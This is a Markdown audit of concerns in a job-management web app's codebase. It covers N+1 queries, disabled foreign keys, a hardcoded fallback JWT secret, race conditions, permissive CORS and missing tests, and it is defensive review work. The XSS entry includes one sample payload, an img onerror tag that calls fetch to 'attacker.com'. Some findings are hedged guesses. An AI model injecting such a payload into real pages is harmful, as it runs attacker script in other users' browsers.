# Codebase Concerns

**Analysis Date:** 2026-02-11

## Tech Debt

### N+1 Query Patterns in Bases Listing

**Issue:** `GET /api/bases` endpoint fetches all user bases then loops through each to fetch records and properties separately, causing N+1 queries.

**Files:** `backend/src/routes/bases.js` (lines 24-49)

**Impact:** With 50 bases, this makes 101 database queries instead of 2-3. Scales poorly as user bases grow.

**Fix approach:** Batch fetch all records and properties by base_id in a single query, then group client-side. Or use a view/aggregate query.

---

### Nested Loop Query Patterns in Relation Cleanup

**Issue:** Base deletion cleanup in `backend/src/db/bases.js` uses nested loops over all bases and their records to find relation references (lines 639-679, 687-707).

**Files:** `backend/src/db/bases.js` (functions `cleanupAllRecordReferences`, `cleanupOrphanedRelationProperties`, lines 435-707)

**Impact:** Deleting a single base with relations triggers O(N*M) database queries where N=total bases and M=total records. With 100 bases and 1000 records average, deletion becomes extremely slow.

**Fix approach:** Refactor to use single JOIN-based queries to find related records and batch update them in a transaction, without nested loops.

---

### Repetitive JSON.parse() on Every Record Access

**Issue:** Every time a record's `data` field is accessed, it's parsed from JSON without caching. Relations expansion re-parses the same JSON multiple times per request.

**Files:** `backend/src/db/bases.js` (multiple functions), `backend/src/routes/bases.js` (record handling)

**Impact:** CPU overhead for large records with complex data. No observable slowness yet but becomes problematic with 1000+ record requests.

**Fix approach:** Parse record data once on fetch and pass the parsed object through the call chain. Implement a simple record cache layer for the duration of request handling.

---

### PRAGMA foreign_keys Disabled for Core Bases

**Issue:** `insertView` function in `backend/src/db/bases.js` (lines 832-841) disables foreign key constraints to support core bases that don't exist in the bases table.

**Files:** `backend/src/db/bases.js` (function `insertView`, lines 829-842)

**Impact:** Orphaned view records can be created pointing to non-existent bases. Referential integrity is lost. Views created during the PRAGMA OFF window could reference deleted bases.

**Fix approach:** Either (1) create stub entries in the bases table for core bases with a `is_core=1` flag, or (2) remove the foreign key constraint entirely and validate in application code.

---

## Known Bugs

### Default JWT Secret Exposed in Production

**Issue:** `backend/src/middleware/auth.js` line 3 has a fallback dev secret: `const JWT_SECRET = process.env.JWT_SECRET || 'dev-secret-change-in-production';`

**Files:** `backend/src/middleware/auth.js` (line 3)

**Symptom:** If `JWT_SECRET` environment variable is not set, the application uses a hardcoded secret that anyone reading the source code knows. All tokens issued are cryptographically weak.

**Trigger:** Running the app without explicitly setting `JWT_SECRET` in environment.

**Workaround:** None. Must require explicit env var at startup.

**Fix approach:** Remove fallback. Throw error on startup if `JWT_SECRET` is missing.

---

### Missing Validation on Phase Assignment

**Issue:** `requirePhaseAccess` function in `backend/src/middleware/permissions.js` (line 44) checks a `phase_assignments` table that doesn't appear to exist in schema.

**Files:** `backend/src/middleware/permissions.js` (lines 35-49), `backend/src/db/schema.js` (no phase_assignments table found)

**Symptom:** Field techs attempting to access phases would get null/undefined from the prepared statement, possibly returning false (denying access) even for valid assignments.

**Trigger:** Any non-management user trying to access phase endpoints.

**Workaround:** Management and office_coordinator roles bypass this (line 47), so only affects field_tech access.

**Fix approach:** Either (1) create and populate phase_assignments table in schema, or (2) remove the permission check and rely on job-level access control.

---

### Unsafe innerHTML in Frontend Rendering

**Issue:** Multiple frontend modules use `.innerHTML =` to render user data and API responses without sanitization.

**Files:** `frontend/js/apex-jobs.js` (lines 245, 352, 359, 410, 483, 535, 562, 751, 1323), `frontend/js/bases.js` (lines 989, 1008, 1022, 1518, 1608, 1688, 1691, 1711, 1817, 1884, 2397, 2468, 2546, 2823)

**Impact:** If job names, client names, notes, or record values contain HTML/JavaScript, they will execute in the page context. XSS vulnerability.

**Trigger:** An attacker creating a job with name `<img src=x onerror=fetch('attacker.com')>` would execute arbitrary JS in any user's browser viewing that job.

**Workaround:** None. Browser's same-origin policy provides minimal defense.

**Fix approach:** Replace all `.innerHTML = html` with `.textContent = text` or use DOM methods (createElement, appendChild). Only use innerHTML for trusted HTML fragments, wrapped with DOMPurify.

---

### No Validation on Job Type Arrays

**Issue:** `backend/src/db/apexJobs.js` (function `createJob`, line 106) iterates over `data.job_types` without validating that it's an array or contains valid type codes.

**Files:** `backend/src/db/apexJobs.js` (lines 106-119)

**Impact:** If a malformed `job_types` payload is sent (null, string, object), the code silently creates zero phases. No error is returned to the client, so users think the job was created with phases when it wasn't.

**Trigger:** POST `/api/apex-jobs` with `job_types: "mitigation"` (string instead of array) or `job_types: null`.

**Workaround:** Retry the request with correctly formatted array.

**Fix approach:** Add schema validation: require job_types to be a non-empty array of valid type codes before creating job. Return 400 with clear error message if invalid.

---

### Race Condition in Job Number Generation

**Issue:** `generateJobNumber` function in `backend/src/db/apexJobs.js` (lines 18-29) uses INSERT OR IGNORE + SELECT + UPDATE pattern without atomicity guarantees.

**Files:** `backend/src/db/apexJobs.js` (lines 18-29, 23-26)

**Impact:** If two users create jobs simultaneously, they could get the same job number. SQLite transactions are per-connection, not enforced between prepared statements executed separately.

**Trigger:** Two POST requests to create jobs with same type on same date within milliseconds of each other.

**Workaround:** None that users can control. Collision is rare but possible under load.

**Fix approach:** Wrap the entire generateJobNumber logic in a `db.transaction()` block to atomically check, increment, and return the sequence number.

---

## Security Considerations

### CORS Allows All Origins in Development

**Issue:** `backend/src/index.js` (line 32) has `origin: process.env.CORS_ORIGIN || true`, which allows all origins when env var not set.

**Files:** `backend/src/index.js` (line 31-34)

**Risk:** In production without explicit CORS_ORIGIN, any website can make authenticated requests to the API on behalf of logged-in users.

**Current mitigation:** Credentials are HTTP-only cookies, so cross-origin requests cannot read responses. Still allows state-changing operations (POST/PATCH/DELETE).

**Recommendations:** (1) Set CORS_ORIGIN to single origin in production config, (2) Add same-site token signing or CSRF tokens for state-changing operations, (3) Document CORS setup in .env.example.

---

### API Key Validation Lacks Timing Attack Resistance

**Issue:** `validateApiKey` in `backend/src/db/apiKeys.js` (lines 44-56) uses simple string comparison on hashed keys. If implemented naively, timing could leak information about valid key prefixes.

**Files:** `backend/src/db/apiKeys.js` (lines 44-56)

**Risk:** Low. Node's `===` comparison is reasonably fast, and attackers would need to make millions of requests to extract bits of information.

**Current mitigation:** Rate limiting on auth routes (login/signup) doesn't apply to API key validation. Could be hammered.

**Recommendations:** (1) Apply rate limiting to API key validation based on key prefix, (2) Use crypto.timingSafeEqual for hash comparison (not applicable here since using hash directly from DB), (3) Add login attempt logging/alerting.

---

### Password Hashing Uses Hardcoded BCRYPT_ROUNDS

**Issue:** `backend/src/db/users.js` (line 4 - check actual value) defines BCRYPT_ROUNDS constant. Not a bug but potential issue if value is too low.

**Files:** `backend/src/db/users.js`

**Risk:** If BCRYPT_ROUNDS < 10, password hashing is fast enough to brute-force at scale.

**Recommendation:** Verify BCRYPT_ROUNDS >= 12 for modern hardware. Document choice.

---

### No Input Sanitization on Job/Contact Names

**Issue:** `backend/src/db/apexJobs.js` (line 49) constructs job name directly from user input without length checks or sanitization.

**Files:** `backend/src/db/apexJobs.js` (lines 46-82)

**Risk:** Names can be arbitrarily long, exhausting database storage. Names containing null bytes could break downstream systems.

**Current mitigation:** SQLite enforces reasonable field sizes implicitly.

**Recommendations:** (1) Add max length validation (e.g., 200 chars) on name fields, (2) Reject null bytes and control characters, (3) Document limits in API schema.

---

## Performance Bottlenecks

### Kanban View Renders All Records in Memory

**Issue:** `frontend/js/kanban.js` and `frontend/js/dashboard.js` fetch and render all tasks/jobs at once without pagination or virtual scrolling.

**Files:** `frontend/js/kanban.js`, `frontend/js/dashboard.js`, `frontend/js/apex-jobs.js`

**Problem:** With 500+ items, DOM rendering becomes visibly slow. Memory usage grows linearly.

**Cause:** Vanilla JS without a framework, no built-in pagination or lazy loading support.

**Improvement path:** (1) Implement pagination on backend (limit=50, offset=N), (2) Add infinite scroll or "load more" button on frontend, (3) Use virtual DOM or simple element reuse for large lists.

---

### Relations Expansion Fetches Related Records One-by-One

**Issue:** `expandRelations` function in `backend/src/db/bases.js` (lines 389-429) calls `getRecordsByIds()` for each relation property, not batching across properties.

**Files:** `backend/src/db/bases.js` (lines 389-429, specifically line 411)

**Impact:** Getting a single record with 5 relation properties makes 5 separate DB queries. Should be 1.

**Improvement path:** Collect all related record IDs across all relation properties first, fetch them once, then map results to properties.

---

### Calendar View Loads All Events Without Filtering

**Issue:** `frontend/js/calendar.js` likely fetches all calendar events for all months/years without date-based filtering (typical for vanilla JS calendar implementations).

**Files:** `frontend/js/calendar.js` (2782 lines - likely has this pattern)

**Impact:** Viewing calendar with 5000+ events is slow. Even rendering invisible events wastes CPU.

**Improvement path:** Add date range filters to calendar fetch endpoints. Only load current month + adjacent months on page load.

---

## Fragile Areas

### Core Bases Are Code-Defined Without Schema Enforcement

**Issue:** Core bases (`core-people`, `core-notes`, etc.) are defined as JavaScript objects in `backend/src/db/coreBases.js`, not in the database schema.

**Files:** `backend/src/db/coreBases.js` (entire file, especially CORE_BASES definition)

**Why fragile:** (1) Renaming a core base requires code changes, (2) New core bases aren't validated by schema, (3) Relation properties can point to core bases that don't exist in the bases table, (4) Foreign key constraints are disabled to support this (see PRAGMA issue above).

**Safe modification:** Use database migrations to create proper core base records with `is_core=1` flag, validate in application code rather than database layer.

**Test coverage:** No tests for core base schema consistency.

---

### Apex Jobs Have Complex Phase Lifecycle

**Issue:** `backend/src/db/apexJobs.js` implements complex phase management (multiple phases per job, MIT/RPR/RMD types) with multiple data tables (`apex_jobs`, `apex_job_phases`, `apex_job_estimates`, `apex_job_labor`, etc.).

**Files:** `backend/src/db/apexJobs.js` (1292 lines), `backend/src/db/apexSchema.js` (454 lines)

**Why fragile:** (1) No documented state machine for job/phase transitions, (2) No validation of state changes (can a job move directly from 'active' to 'done' without completing phases?), (3) Multiple tables must stay in sync; if one transaction fails, orphaned records remain, (4) No soft-delete on records makes recovery impossible.

**Safe modification:** Document valid state transitions. Add state validation in `updateJob`. Use database constraints or triggers to enforce invariants.

**Test coverage:** No tests for phase state transitions or multi-phase job consistency.

---

### Base Deletion With Relations Is Complex

**Issue:** Deleting a base that other bases relate to requires three cleanup operations in sequence: `cleanupAllRecordReferences`, `cleanupOrphanedRelationProperties`, then `deleteBase`.

**Files:** `backend/src/db/bases.js` (lines 716-729 and called functions)

**Why fragile:** (1) Operations must run in exact order, (2) If transaction fails midway, referential integrity is lost, (3) Nested loops are inefficient (see N+1 section), (4) No rollback mechanism if a cleanup fails.

**Safe modification:** Refactor to single atomic transaction with optimized queries. Add integration tests for base deletion with complex relation graphs.

**Test coverage:** No tests for cascading deletion scenarios.

---

### Frontend API Client Has No Error Boundary

**Issue:** `frontend/js/api.js` (706 lines) makes fetch requests but frontend modules don't consistently handle network errors.

**Files:** `frontend/js/api.js`, `frontend/js/apex-jobs.js`, `frontend/js/bases.js`, etc.

**Why fragile:** (1) Network errors during data loads leave UI in loading state forever, (2) Partial data updates (e.g., job created but label fetch fails) leave UI inconsistent, (3) No retry logic, (4) No user-facing error messages for many failures.

**Safe modification:** Add global error boundary/handler that catches unhandled promise rejections and shows toast notifications. Implement exponential backoff retry for transient failures.

**Test coverage:** No integration tests for API error scenarios.

---

### Job Detail Modals Are Tightly Coupled to DOM

**Issue:** `frontend/js/jobDetailModals.js` (1049 lines) and related files directly manipulate HTML, creating modals with embedded event listeners.

**Files:** `frontend/js/jobDetailModals.js`, `frontend/js/jobDetailTabs.js`, `frontend/js/jobModal.js`

**Why fragile:** (1) Modal state is spread across DOM attributes and JavaScript variables, (2) Race conditions if multiple modals open simultaneously, (3) Cleanup on close may not remove all event listeners (memory leaks), (4) No validation that required modal elements exist before accessing.

**Safe modification:** Extract modal logic into a simple state machine or use a lightweight modal library. Ensure cleanup happens in a finally block or via destructors.

**Test coverage:** No tests for modal lifecycle or concurrent modal handling.

---

## Scaling Limits

### SQLite Single-Writer Bottleneck

**Current capacity:** SQLite with WAL mode handles ~10-20 concurrent writes on a single machine before contention becomes noticeable.

**Limit:** At 50+ concurrent API requests with writes, SQLite will start queueing and users experience request timeouts (30+ seconds).

**Scaling path:** (1) For 10-50 users: consider PostgreSQL, (2) For 100+ users: require separate read replicas or sharding, (3) Document single-user assumption in README.

---

### In-Memory DOM Rendering Limits

**Current capacity:** Frontend Kanban/Calendar/Bases views comfortably handle 500 items. Beyond 1000 items, rendering takes 2-5 seconds.

**Limit:** At 5000+ items, page becomes unusable (10+ second render times, memory bloat).

**Scaling path:** (1) Implement pagination (50 items per page), (2) Add virtual scrolling for infinite-scroll views, (3) Consider migrating to a lightweight framework (React, Vue, Svelte) if this is critical.

---

### Database File Size

**Current capacity:** SQLite database file grows to ~500MB with typical usage (10K tasks, 5K notes, 1K people, etc.).

**Limit:** Database backups become slow (>1 minute to dump), and WAL file management requires periodic cleanup/checkpoints.

**Scaling path:** (1) Implement data archival (move old jobs to archive table), (2) Regular VACUUM maintenance jobs, (3) Monitor .db-wal file growth, (4) Switch to PostgreSQL if file exceeds 1GB.

---

## Dependencies at Risk

### No Native Vulnerability Scanning

**Issue:** No npm audit or dependabot configured. Security patches may be missed.

**Files:** `backend/package.json` (likely has outdated transitive dependencies)

**Risk:** Medium. Direct dependencies (express, bcrypt, uuid) are well-maintained, but transitive deps could be stale.

**Impact:** If a security fix is released for a transitive dependency, app remains vulnerable until manually updated.

**Migration plan:** (1) Add `npm audit` to CI/CD, (2) Configure Dependabot for automated PR updates, (3) Review and test updates monthly.

---

### better-sqlite3 Has Compatibility Risk

**Issue:** `better-sqlite3` is a native Node module that requires compilation. If Node version or system libraries change, recompilation may fail.

**Files:** `backend/src/db/schema.js` imports from `better-sqlite3`

**Risk:** Low to medium. Docker ensures consistent environment, but local development or system upgrades could break builds.

**Impact:** Developers may be unable to run `npm install` locally if compilation fails.

**Migration plan:** (1) Document system requirements (Node 20+), (2) Provide Docker-based dev environment, (3) Consider sql.js or sqlite3 if native issues persist.

---

## Missing Critical Features

### No Database Transactions for Multi-Operation Endpoints

**Issue:** Many endpoints that modify multiple related entities (e.g., creating a job with multiple phases) use transactions, but most endpoints that update a single entity don't.

**Files:** `backend/src/routes/bases.js`, `backend/src/routes/apexJobs.js`, `backend/src/routes/tasks.js`

**Problem:** Partial updates are possible. If a request updates a job and then errors updating a phase, the job change persists but user sees an error, leading to confusion.

**Blocks:** Building reliable sync between frontend and backend. Can't guarantee data consistency after errors.

---

### No Request Validation/Schema Library

**Issue:** Route handlers manually validate input (check for required fields, regex on email) but there's no centralized schema validation library like Joi or Zod.

**Files:** `backend/src/routes/auth.js` (lines 53-78 show manual validation), every route file

**Problem:** Validation is inconsistent. Some routes validate deeply, others don't validate at all. Bug fixes in one place don't propagate.

**Blocks:** Adding new fields or endpoints requires remembering to add validation in multiple places.

---

### No API Documentation

**Issue:** No OpenAPI/Swagger schema or README documenting API endpoints.

**Files:** None. This is the gap.

**Problem:** Developers (and future maintainers) must read source code to understand endpoints. Breaking changes can be made unknowingly.

**Blocks:** Onboarding new contributors, building mobile clients, creating client libraries.

---

### No Audit Logging

**Issue:** No log of who modified what, when. Only console.error logs are output.

**Files:** None. No audit table in schema.

**Problem:** Security incidents (unauthorized job edits, data theft) can't be investigated. Compliance audits fail.

**Blocks:** Enterprise deployments that require audit trails.

---

## Test Coverage Gaps

### No Unit Tests for Database Layer

**Issue:** All database modules (`backend/src/db/*.js`) have no tests.

**What's not tested:** (1) Relation cleanup on base deletion (critical!), (2) Job number generation under concurrency, (3) Transaction rollback behavior, (4) JSON field parsing errors.

**Files:** `backend/src/db/bases.js`, `backend/src/db/apexJobs.js`, `backend/src/db/apexSchema.js`

**Risk:** High. Changes to database operations could silently break data integrity.

**Priority:** High. Start with tests for base/relation deletion and job creation.

---

### No Integration Tests for API Routes

**Issue:** No tests that spin up the server and make end-to-end requests.

**What's not tested:** (1) Auth flow (signup → login → protected endpoint), (2) Job creation with phases, (3) Permission checks on Apex routes, (4) Error responses and status codes.

**Files:** All route files in `backend/src/routes/`

**Risk:** Medium. Regressions in auth or role checks could be deployed without detection.

**Priority:** Medium. Focus on critical paths: auth, job CRUD, permission checks.

---

### No Frontend Tests

**Issue:** No unit, integration, or e2e tests for frontend.

**What's not tested:** (1) Modal state transitions, (2) Filter/sort logic in Kanban and Bases, (3) XSS vulnerabilities (mentioned above), (4) API error handling.

**Files:** `frontend/js/*.js` (all files)

**Risk:** High. UI bugs and XSS vulnerabilities ship to users frequently.

**Priority:** High for security (XSS tests), medium for functionality.

---

### No Load/Stress Tests

**Issue:** No tests simulating 100+ concurrent users, large datasets, or slow networks.

**What's not tested:** (1) N+1 query impacts at scale, (2) SQLite write lock contention, (3) Frontend rendering with 5000+ items, (4) API response times under load.

**Files:** All

**Risk:** Low in current state (single user), but will be discovered painfully in production when adding multi-user features.

**Priority:** Low now, high before multi-user deployment.

---

*Concerns audit: 2026-02-11*
